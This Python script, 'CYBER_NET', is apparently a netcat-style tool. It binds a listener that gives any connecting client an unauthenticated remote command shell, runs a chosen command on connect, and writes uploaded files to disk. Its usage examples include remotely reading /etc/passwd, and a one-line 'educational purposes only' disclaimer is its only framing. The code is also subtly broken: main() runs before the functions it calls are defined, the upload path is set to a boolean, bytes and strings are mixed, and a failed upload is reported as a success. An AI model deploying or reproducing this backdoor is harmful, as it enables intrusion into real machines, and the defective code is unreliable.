#!/usr/bin/python
import pyfiglet
import threading, subprocess, getopt, socket, sys

copyright = '''
    copyright [2022] [Owusu Ansah Kwadwo]

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
   '''


toolName = pyfiglet.figlet_format("CYBER_NET")
version = 'version 1.0'
print(toolName, version)

print("# Coded By: CYBER PROGRAMMER")
print("")
print("")
print("")
print("""For Educational purposes only!\n\n
This script is used to create a server that can be used to run a command on a remote computer.\n\n
It will listen on the port specified by the --port option.\n\n
""")

listen = False
command = False
upload = False
execute = ""
upload_destination = ""
target = ""
port = 0


def usage():
    print("Cyber Net Tool")
    print("")
    print("Usage: cybernet.py -t target_host -p port [options]")
    print("")
    print("""
    -h --help                   - To print this menu
    -l --listen                 - Listen on [host]:[port] for incoming connections
    -e --execute=file_to_run    - Execute the given file upon receiving a connection
    -c --command                - initiate the command shell
    -u --upload=destination     - Upload files and write to destination upon receiving a connection
    print("")
    Examples:
    cybernet.py -t 192.168.43.42 -p 80 -l -c
    cybernet.py -t 192.168.43.42 -p 80 -l -u=http://localhost:8181/cyber/scripts/cyber_net_tool.py
    cybernet.py -t http://localhost:8181/cyber/scripts/cyber_net_tool.py -h
    cybernet.py -t 192.168.43.42 -p 80 -l -e=\"cat /etc/passwd\""
    """)
    print(" 'The cyber_net_tool' | ./cybernet.py -t 192.168.43.42 -p 8080")
    sys.exit(0)


def main():
    global listen
    global port
    global upload_destination
    global upload
    global command
    global execute
    global target

    if not len(sys.argv[1:]):
        usage()

    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu",
                                   ["help", "listen", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()
    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--command"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = True
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"

    if not listen and len(target) and port > 0:
        buffer = sys.stdin.read()
        client_sender(buffer)
    if listen:
        server_loop()


main()


def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client.connect((target, port))

        if len(buffer):
            client.send(buffer)
        while True:
            recv_len = 1
            response = ""
            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data

                if recv_len < 4096:
                    break
            print(response),
            buffer = input("")

            buffer += "\n"

            client.send(buffer)

    except:
        print("[*] Exception!   Exiting...")
        client.close()


def server_loop():
    global target

    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)

    while True:
        client_socket, addr = server.accept()
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()


def run_command(command):
    command = command.rstrip()

    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)

    except:
        output = "Failed to execute command.\r\n"
    return output


def client_handler(client_socket):
    global upload
    global execute
    global command

    if len(upload_destination):
        file_buffer = ""

        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data
        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            client_socket.send("Successfully saved to %s\r\n" % upload_destination)
        except:
            client_socket.send("Successfully saved to %s\r\n" % upload_destination)

    if len(execute):
        output = run_command(execute)
        client_socket.send(output)
    if command:
        while True:
            client_socket.send("<CNT:#> ")
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)
            response = run_command(cmd_buffer)
            client_socket.send(response)
